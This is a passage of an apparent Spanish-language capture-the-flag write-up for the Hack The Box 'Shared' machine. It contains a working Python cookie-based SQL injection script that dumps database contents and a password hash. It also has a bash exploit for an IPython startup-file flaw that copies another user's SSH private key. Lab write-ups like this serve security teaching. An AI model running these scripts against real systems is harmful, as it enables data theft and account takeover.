<span class="kn">import</span> <span class="nn">urllib3</span>

<span class="c1"># pip install beautifulsoup4 &amp; pip instal lxml
</span><span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
<span class="c1"># pip3 install pwn
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>


<span class="c1"># SQLi:
#	custom_cart = {"53GG2EF8' and false union select null,(select group_concat(0x7c, version(), 0x7c), null#":  "1"}
</span>
<span class="c1"># global variables
</span>
<span class="n">domain_host</span> <span class="o">=</span> <span class="s">'shared.htb'</span>
<span class="n">subdomain_host</span> <span class="o">=</span> <span class="s">'checkout'</span>
<span class="n">target_host</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'https://</span><span class="si">{</span><span class="n">subdomain_host</span><span class="si">}</span><span class="s">.</span><span class="si">{</span><span class="n">domain_host</span><span class="si">}</span><span class="s">'</span>

<span class="c1"># disable TLS warnings
</span>
<span class="n">urllib3</span><span class="p">.</span><span class="n">disable_warnings</span><span class="p">()</span>

<span class="c1"># ctrl C
</span>
<span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">signal</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
	<span class="n">log</span><span class="p">.</span><span class="n">failure</span><span class="p">(</span><span class="s">'Aborted!'</span><span class="p">)</span>
	<span class="nb">exit</span><span class="p">()</span>

<span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">def_handler</span><span class="p">)</span>

<span class="c1"># inyection types
</span>
<span class="k">def</span> <span class="nf">get_databases</span><span class="p">():</span>
	<span class="k">return</span> <span class="s">"""' and false union select null, (select group_concat(0x7c, schema_name, 0x7c) from information_schema.schemata), null#"""</span>

<span class="k">def</span> <span class="nf">get_tables</span><span class="p">(</span><span class="n">database</span><span class="p">):</span>
	<span class="k">return</span> <span class="sa">f</span><span class="s">"""' and 1=0 union select null, (select group_concat(0x7c, table_name, 0x7c) from information_schema.tables where table_schema = '</span><span class="si">{</span><span class="n">database</span><span class="si">}</span><span class="s">'), null#"""</span>

<span class="k">def</span> <span class="nf">get_columns</span><span class="p">(</span><span class="n">table</span><span class="p">):</span>
	<span class="k">return</span> <span class="sa">f</span><span class="s">"""' and 0 union select null, (select group_concat(0x7c, column_name, 0x7c) from information_schema.columns where table_name = '</span><span class="si">{</span><span class="n">table</span><span class="si">}</span><span class="s">'), null#"""</span>

<span class="k">def</span> <span class="nf">get_fields</span><span class="p">(</span><span class="n">column</span><span class="p">,</span> <span class="n">table</span><span class="p">):</span>
	<span class="k">return</span> <span class="sa">f</span><span class="s">"""' and 1&gt;2 union select null, (select group_concat(0x7c, </span><span class="si">{</span><span class="n">column</span><span class="si">}</span><span class="s">, 0x7c) from </span><span class="si">{</span><span class="n">table</span><span class="si">}</span><span class="s">), null#"""</span>

<span class="k">def</span> <span class="nf">get_info</span><span class="p">(</span><span class="n">query</span><span class="p">):</span>
	<span class="k">return</span> <span class="sa">f</span><span class="s">"""' and 2=1 union select null, (select group_concat(0x7c, </span><span class="si">{</span><span class="n">query</span><span class="si">}</span><span class="s">, 0x7c)), null#"""</span>

<span class="c1"># selection of query types
</span>
<span class="k">def</span> <span class="nf">type_inyection</span><span class="p">(</span><span class="n">args</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">get_databases</span><span class="p">()</span>
        <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">database</span> <span class="ow">and</span> <span class="n">args</span><span class="p">.</span><span class="n">table</span> <span class="ow">and</span> <span class="n">args</span><span class="p">.</span><span class="n">column</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">get_fields</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">column</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">table</span><span class="p">)</span>
        <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">database</span> <span class="ow">and</span> <span class="n">args</span><span class="p">.</span><span class="n">table</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">get_columns</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">table</span><span class="p">)</span>
        <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">database</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">get_tables</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">database</span><span class="p">)</span>
        <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">query</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">get_info</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">query</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>


<span class="c1"># request for inyection
</span>
<span class="k">def</span> <span class="nf">request</span><span class="p">(</span><span class="n">args</span><span class="p">):</span>
	<span class="k">with</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span> <span class="k">as</span> <span class="n">s</span><span class="p">:</span>

		<span class="c1"># select inyection type
</span>		<span class="n">inyection</span> <span class="o">=</span> <span class="n">type_inyection</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>

		<span class="c1"># Hummingbird printed t-shirt ID (cookie value)
</span>		<span class="c1"># add inyection
</span>		<span class="n">product_id</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"""53GG2EF8</span><span class="si">{</span><span class="n">inyection</span><span class="si">}</span><span class="s">"""</span>
		<span class="n">cookie_value</span> <span class="o">=</span> <span class="s">'{"'</span> <span class="o">+</span> <span class="n">product_id</span> <span class="o">+</span> <span class="s">'":"1"}'</span>

		<span class="c1"># urlencode cookie value
</span>		<span class="n">urlcode_cookie</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="n">quote</span><span class="p">(</span><span class="n">cookie_value</span><span class="p">)</span>

		<span class="c1"># create cookie
</span>		<span class="n">malicious_cookie</span> <span class="o">=</span> <span class="p">{</span> 
			<span class="s">"custom_cart"</span> <span class="p">:</span> <span class="n">urlcode_cookie</span>
		<span class="p">}</span>

		<span class="c1"># inyect cookie
</span>		<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">target_host</span><span class="si">}</span><span class="s">'</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">malicious_cookie</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
		
		<span class="c1"># show information
</span>		<span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="s">'lxml'</span><span class="p">)</span>
		<span class="k">print</span><span class="p">()</span>
		<span class="k">print</span><span class="p">(</span><span class="n">soup</span><span class="p">.</span><span class="n">td</span><span class="p">.</span><span class="n">string</span><span class="p">)</span>

<span class="c1"># program flow
</span>
<span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">args</span><span class="p">):</span>
	<span class="n">request</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>

	<span class="c1"># Help panel 
</span>	<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s">'SQLi Shared HTB'</span><span class="p">)</span>
	
	<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-d'</span><span class="p">,</span> <span class="s">'--database'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Select database'</span><span class="p">)</span>
	<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-t'</span><span class="p">,</span> <span class="s">'--table'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Select table'</span><span class="p">)</span>
	<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-c'</span><span class="p">,</span> <span class="s">'--column'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Select column'</span><span class="p">)</span>
	<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-q'</span><span class="p">,</span> <span class="s">'--query'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'One word query (g.e version())'</span><span class="p">)</span>

	<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>

	<span class="c1"># pass args object
</span>	<span class="n">main</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Puedes encontrar el script en mi repositorio <a href="https://github.com/E1P0TR0/CVE-Machines_htb/blob/main/Auto-tools_Shared/sql_inyection.py">https://github.com/E1P0TR0</a></p></div></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="go">‚ùØ python3 sql_inyection.py

|information_schema|,|checkout|
‚ùØ python3 sql_inyection.py -d checkout

|user|,|product|
‚ùØ python3 sql_inyection.py -d checkout -t user

|id|,|username|,|password|
‚ùØ python3 sql_inyection.py -d checkout -t user -c username

|james_mason|
‚ùØ python3 sql_inyection.py -d checkout -t user -c password

|fc895d4eddc2fc12f995e18c865cf273|
</span></pre></table></code></div></div><p>Al ejecutar el codigo obtenemos el usuario <code class="language-plaintext highlighter-rouge">james_mason</code> y su contrase√±a en formato <strong>hash</strong>, para ello podemos usar las herramientas <code class="language-plaintext highlighter-rouge">hashid</code> o <code class="language-plaintext highlighter-rouge">hash-identifier</code> para identificar el tipo de hash y luego poder crackearla. En esta oportunidad usamos la p√°gina <strong>https://crackstation.net/</strong>, la cu√°l halla la contrase√±a en unos segundos:</p><p><img data-src="/assets/img/htb/writeups/shared/crackstation_hash.png" alt="CRACKSTATION" class="shadow" data-proofer-ignore></p><blockquote><p>Plataforma legal para crackear contrase√±as <a href="https://crackstation.net/">https://crackstation.net/</a></p></blockquote><p>Ahora con la contrase√±a y recordando que tenemos el puerto <strong>22(SSH)</strong> abierto, entramos con las credenciales obtenidas como el usuario <code class="language-plaintext highlighter-rouge">james_mason</code>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="go">‚ùØ ssh james_mason@10.10.11.172
james_mason@10.10.11.172's password: 
</span><span class="gp">Linux shared 5.10.0-16-amd64 #</span>1 SMP Debian 5.10.127-1 <span class="o">(</span>2022-06-30<span class="o">)</span> x86_64
<span class="go">
</span><span class="gp">The programs included with the Debian GNU/Linux system are free software;</span><span class="w">
</span><span class="go">the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Aug 15 21:11:13 2022 from 10.10.14.54
</span><span class="gp">james_mason@shared:~$</span><span class="w"> </span><span class="nb">whoami</span>
<span class="go">james_mason
</span><span class="gp">james_mason@shared:~$</span><span class="w"> </span>find / <span class="nt">-name</span> user.txt 2&gt;/dev/null | xargs <span class="nb">ls</span> <span class="nt">-l</span>
<span class="go">-rw-r----- 1 root dan_smith 33 Aug 14 18:28 /home/dan_smith/user.txt
</span></pre></table></code></div></div><p>Ya dentro nos damos cuenta que no tenemos permiso para leer la flag, el archivo tiene los permisos <code class="language-plaintext highlighter-rouge">rw-r-----</code> lo cu√°l solo permite leer el archivo al usuario <code class="language-plaintext highlighter-rouge">root</code> y los que pertecen al grupo <code class="language-plaintext highlighter-rouge">dan_smith</code>, entonces es nuestro objetivo</p><p>Antes de eso buscamos el c√≥digo <strong>php</strong> no sanitizado que nos permiti√≥ <strong>SQL Inyection</strong>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="gp">james_mason@shared:~$</span><span class="w"> </span><span class="nb">cat</span> /var/www/checkout.shared.htb/index.php | <span class="nb">grep </span>sql
<span class="gp">    $</span>conn <span class="o">=</span> new mysqli<span class="o">(</span>DBHOST, DBUSER, DBPWD, DBNAME<span class="o">)</span><span class="p">;</span>
<span class="gp">            $</span>sql <span class="o">=</span> <span class="s2">"SELECT id, code, price from product where code='"</span>.<span class="nv">$code</span>.<span class="s2">"'"</span><span class="p">;</span> &lt;<span class="nt">--------</span> query concatenation <span class="o">(</span>typical error<span class="o">)</span>
<span class="go">            // Prevent time-based sql injection
</span><span class="gp">            if(strpos(strtolower($</span>sql<span class="o">)</span>, <span class="s2">"sleep"</span><span class="o">)</span> <span class="o">!==</span> <span class="nb">false</span> <span class="o">||</span> strpos<span class="o">(</span>strtolower<span class="o">(</span><span class="nv">$sql</span><span class="o">)</span>, <span class="s2">"benchmark"</span><span class="o">)</span> <span class="o">!==</span> <span class="nb">false</span><span class="o">)</span>
<span class="gp">            $</span>result <span class="o">=</span> <span class="nv">$conn</span>-&gt;query<span class="o">(</span><span class="nv">$sql</span><span class="o">)</span><span class="p">;</span>
<span class="gp">            if($</span>result <span class="o">&amp;&amp;</span> mysqli_num_rows<span class="o">(</span><span class="nv">$result</span><span class="o">)</span> <span class="o">&gt;=</span> 1<span class="o">)</span> <span class="o">{</span>
<span class="gp">                $</span>product <span class="o">=</span> mysqli_fetch_assoc<span class="o">(</span><span class="nv">$result</span><span class="o">)</span><span class="p">;</span>
</pre></table></code></div></div><p>Empezamos haciendo un reconocimiento b√°sico del sistema y encontramos con el comando <code class="language-plaintext highlighter-rouge">id</code> (informaci√≥n de usuario y grupo) que nuestro usuario pertenece al grupo <code class="language-plaintext highlighter-rouge">1001(developer)</code>, adem√°s listamos que ambos usuarios pertenecen al mismo grupo (una manera de combinar a los usuarios), y el <strong>uid(1001)</strong> pertenece al usuario <code class="language-plaintext highlighter-rouge">dan_smith</code>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="gp">james_mason@shared:~$</span><span class="w"> </span><span class="nb">grep </span>1001 /etc/group
<span class="go">developer:x:1001:james_mason,dan_smith  &lt;-------------- Same group
</span><span class="gp">james_mason@shared:~$</span><span class="w"> </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep </span>bash
<span class="go">root:x:0:0:root:/root:/bin/bash
james_mason:x:1000:1000:james_mason,,,:/home/james_mason:/bin/bash
dan_smith:x:1001:1002::/home/dan_smith:/bin/bash &lt;-------- !
</span></pre></table></code></div></div><p>Con esa informaci√≥n buscamos directorios y archivos con los permisos <em>Group id</em> <strong>gid(1001)</strong>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">james_mason@shared:~$</span><span class="w"> </span>find / <span class="nt">-group</span> developer 2&gt;/dev/null
<span class="go">/opt/scripts_review
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>La ruta <code class="language-plaintext highlighter-rouge">/opt</code> esta reservado para almacenar paquetes de distintos softwares (terceros) que no son parte del sistema</p></div></blockquote><p>Encontramos la ruta <em>/opt/scripts_review</em> pero sin ning√∫n contenido. Buscando <strong>archivos ocultos</strong> en el directorio del usuario <code class="language-plaintext highlighter-rouge">dan_smith</code> <em>/home/dan_smith</em> encontramos el directorio <em>.ipython</em>, pero que es eso?</p><p><img data-src="/assets/img/htb/writeups/shared/ipython_definition.png" alt="IPYTHONDEF" class="shadow" data-proofer-ignore></p><p>Probamos usar la shell interactiva y todo funciona correctamente, y adem√°s nos muestra la versi√≥n <code class="language-plaintext highlighter-rouge">IPython 8.0.0</code>. Sin dudarlo intentamos buscar una vulnerabilidad sobre dicha versi√≥n y logramos encontrar una interesante:</p><p><img data-src="/assets/img/htb/writeups/shared/cve-2022-21669.png" alt="CVE-2022-21669" class="shadow" data-proofer-ignore></p><blockquote class="prompt-info"><div><p>M√°s informaci√≥n y explotaci√≥n <a href="https://github.com/advisories/GHSA-pq7m-3gw7-gq5x">CVE-2022-21669</a></p></div></blockquote><p>En resumen, podemos ejecutar comandos como otro usuario. Te explico en que consiste:</p><blockquote><p>Al usar esta shell de python existe una configuraci√≥n y se guarda en la ruta <code class="language-plaintext highlighter-rouge">~/.ipython/profile_default</code> (ruta que tenemos en el directorio del usuario <code class="language-plaintext highlighter-rouge">dan_smith</code>)</p></blockquote><blockquote><p>Dentro de la ruta anterior existe un directorio <code class="language-plaintext highlighter-rouge">/startup</code>, el cu√°l al iniciar <code class="language-plaintext highlighter-rouge">ipython</code> ejecutar√° todos los scripts <em>.py</em> √≥ <em>.ipy</em> que tiene almacenados (puedes ver esta informaci√≥n en el archivo README)</p></blockquote><blockquote class="prompt-info"><div><p>Documentaci√≥n <strong>IPython</strong> <a href="https://ipython.readthedocs.io/en/stable/interactive/tutorial.html#startup-files">https://ipython.readthedocs.io/en/stable/interactive/tutorial.html#startup-files</a></p></div></blockquote><p>Ahora solo nos queda buscar que el usuario <code class="language-plaintext highlighter-rouge">dan_smith</code> pueda ejecutar el comando <code class="language-plaintext highlighter-rouge">IPython</code>, y para conseguir eso usamos la herramienta <code class="language-plaintext highlighter-rouge">pspy</code> para encontrar procesos de otros usuarios:</p><blockquote><p>Descargan la herramienta en su repositorio, lo pasan a la m√°quina v√≠ctima, le dan permisos de ejecuci√≥n y lo ejecutan</p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="gp">james_mason@shared:/tmp$</span><span class="w"> </span>./pspy64                                                                                                                                  <span class="o">[</span>222/222]
<span class="go">pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855         
                                                                                                                                                                            
                                                                                                                                                                            
     ‚ñà‚ñà‚ñì‚ñà‚ñà‚ñà    ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñì‚ñà‚ñà‚ñà ‚ñì‚ñà‚ñà   ‚ñà‚ñà‚ñì                                                                                                                                     
    ‚ñì‚ñà‚ñà‚ñë  ‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà    ‚ñí ‚ñì‚ñà‚ñà‚ñë  ‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà  ‚ñà‚ñà‚ñí                                                                                                                                     
    ‚ñì‚ñà‚ñà‚ñë ‚ñà‚ñà‚ñì‚ñí‚ñë ‚ñì‚ñà‚ñà‚ñÑ   ‚ñì‚ñà‚ñà‚ñë ‚ñà‚ñà‚ñì‚ñí ‚ñí‚ñà‚ñà ‚ñà‚ñà‚ñë                                               
    ‚ñí‚ñà‚ñà‚ñÑ‚ñà‚ñì‚ñí ‚ñí  ‚ñí   ‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà‚ñÑ‚ñà‚ñì‚ñí ‚ñí ‚ñë ‚ñê‚ñà‚ñà‚ñì‚ñë                                                                                                                                     
    ‚ñí‚ñà‚ñà‚ñí ‚ñë  ‚ñë‚ñí‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí‚ñí‚ñà‚ñà‚ñí ‚ñë  ‚ñë ‚ñë ‚ñà‚ñà‚ñí‚ñì‚ñë                                                                                                                                     
    ‚ñí‚ñì‚ñí‚ñë ‚ñë  ‚ñë‚ñí ‚ñí‚ñì‚ñí ‚ñí ‚ñë‚ñí‚ñì‚ñí‚ñë ‚ñë  ‚ñë  ‚ñà‚ñà‚ñí‚ñí‚ñí                                                                                                                                      
    ‚ñë‚ñí ‚ñë     ‚ñë ‚ñë‚ñí  ‚ñë ‚ñë‚ñë‚ñí ‚ñë     ‚ñì‚ñà‚ñà ‚ñë‚ñí‚ñë                                                                                                                                      
    ‚ñë‚ñë       ‚ñë  ‚ñë  ‚ñë  ‚ñë‚ñë       ‚ñí ‚ñí ‚ñë‚ñë                                                                                                                                       
                   ‚ñë           ‚ñë ‚ñë                                                    
                               ‚ñë ‚ñë         
</span><span class="c">...
</span><span class="gp">2022/08/16 01:45:01 CMD: UID=1001 PID=2302   | /bin/sh -c /usr/bin/pkill ipython;</span><span class="w"> </span><span class="nb">cd</span> /opt/scripts_review/ <span class="o">&amp;&amp;</span> /usr/local/bin/ipython &lt;<span class="nt">---</span> Important!
<span class="go">				\___ dan_smith UID 
2022/08/16 01:45:01 CMD: UID=1001 PID=2303   | /usr/bin/pkill ipython 
2022/08/16 01:45:01 CMD: UID=1001 PID=2304   | /usr/bin/python3 /usr/local/bin/ipython
</span><span class="c">...
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Repositorio de la herramienta <a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a></p></div></blockquote><p>Interesante, vemos que el usuario <code class="language-plaintext highlighter-rouge">dan_smith</code> (lo reconocemos por su UID) usa <code class="language-plaintext highlighter-rouge">pkill</code> para cancelar la ejecuci√≥n de <strong>IPython</strong>, luego con <code class="language-plaintext highlighter-rouge">cd</code> va al directorio que vimos anteriormente y con el simbolo l√≥gico <code class="language-plaintext highlighter-rouge">&amp;&amp;</code> ejecuta ipython si el comando anterior fue exitoso (el cu√°l pasar√° ya que sabemos la existencia de esa ruta)</p><p>Entonces con todo lo visto anteriormente procedemos a explotar la vulnerabilidad:</p><blockquote><p>Concepto general (Vulnerable user)</p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="go">mkdir -m 777 /tmp/profile_default
mkdir -m 777 /tmp/profile_default/startup
</span><span class="gp">echo 'print("stealing your private secrets")' &gt;</span><span class="w"> </span>/tmp/profile_default/startup/foo.py
</pre></table></code></div></div><p>Para la explotaci√≥n, pruebas y por si cometemos errores, de manera r√°pida lo metemos en un archivo para usarlo como un script en <code class="language-plaintext highlighter-rouge">bash</code> e intentar copiar la <code class="language-plaintext highlighter-rouge">id_rsa</code> <strong>Private key</strong> de <code class="language-plaintext highlighter-rouge">dan_smith</code>, ya que se dirigir√° a la ruta <em>/opt/scripts_review</em> y all√≠ ejecutara <code class="language-plaintext highlighter-rouge">ipython</code>, el cu√°l buscara el directorio de inicicializaci√≥n <code class="language-plaintext highlighter-rouge">/startup</code> y ejecutar√° los scripts almacenados dentro <code class="language-plaintext highlighter-rouge">00-wh0am1.py</code> (stealing private key):</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="nv">target_path</span><span class="o">=</span><span class="s1">'/opt/scripts_review'</span>
<span class="nv">temp_path</span><span class="o">=</span><span class="s1">'/tmp/.testing'</span>

<span class="c"># create temp file </span>
<span class="k">if</span> <span class="o">[</span> <span class="nt">-d</span> <span class="nv">$temp_path</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
        </span><span class="nb">rm</span> <span class="nt">-r</span> <span class="nv">$temp_path</span>
<span class="k">fi

</span><span class="nb">mkdir</span> <span class="nt">-m</span> 777 <span class="nv">$temp_path</span>

<span class="c"># If target_path not is empty</span>
<span class="k">if</span> <span class="o">[</span> <span class="o">!</span> <span class="nt">-z</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">ls</span> <span class="nt">-A</span> <span class="nv">$target_path</span><span class="si">)</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
        </span><span class="nb">rm</span> <span class="nt">-r</span> <span class="nv">$target_path</span>/<span class="k">*</span>
<span class="k">else
        </span><span class="nb">mkdir</span> <span class="nt">-m</span> 777 <span class="nv">$target_path</span>/profile_default
        <span class="nb">mkdir</span> <span class="nt">-m</span> 777 <span class="nv">$target_path</span>/profile_default/startup

        <span class="nb">echo</span> <span class="s2">"__import__('os').system('cat ~/.ssh/id_rsa &gt; /tmp/.testing/id_rsa; chmod o+rwx /tmp/.testing/id_rsa')"</span> <span class="o">&gt;</span> <span class="nv">$target_path</span>/profile_default/startup/00-wh0am1.py
<span class="k">fi</span>

<span class="c"># ssh connection</span>
<span class="nb">sleep </span>20 <span class="c"># wait until to receive key</span>
ssh <span class="nt">-i</span> <span class="nv">$temp_path</span>/id_rsa dan_smith@localhost
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Puedes encontrar el script en mi repositorio <a href="https://github.com/E1P0TR0/CVE-Machines_htb/blob/main/Auto-tools_Shared/CVE-2022-21699.sh">https://github.com/E1P0TR0</a></p></div></blockquote><p>Ahora lo ejecutamos, esperamos unos segundos, nos logeamos como <code class="language-plaintext highlighter-rouge">dan_smith</code> y conseguimos la flag:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="gp">james_mason@shared:/tmp$</span><span class="w"> </span>./CVE-2022-21699.sh
<span class="gp">Linux shared 5.10.0-16-amd64 #</span>1 SMP Debian 5.10.127-1 <span class="o">(</span>2022-06-30<span class="o">)</span> x86_64
<span class="go">
</span><span class="gp">The programs included with the Debian GNU/Linux system are free software;</span><span class="w">
</span><span class="go">the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 16 03:19:09 2022 from 127.0.0.1
</span><span class="gp">dan_smith@shared:~$</span><span class="w"> </span><span class="nb">whoami</span>
<span class="go">dan_smith
</span><span class="gp">dan_smith@shared:~$</span><span class="w"> </span>find / <span class="nt">-name</span> user.txt 2&gt;/dev/null | xargs <span class="nb">ls</span> <span class="nt">-l</span>
<span class="go">-rw-r----- 1 root dan_smith 33 Aug 16 00:52 /home/dan_smith/user.txt
